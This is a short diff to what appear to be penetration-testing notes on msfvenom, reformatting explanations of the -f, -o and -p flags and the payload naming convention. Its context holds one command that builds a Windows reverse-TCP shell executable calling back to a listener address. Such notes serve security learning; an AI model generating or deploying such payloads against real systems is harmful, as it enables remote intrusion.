@@ -6,7 +6,10 @@ standard syntax
     
     msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
     
-    # -f format -o filename/location
+common flags
+    -f format 
+    -o filename/location
+    -p payloadname
 
 payload naming convention:
     os/arch/payload
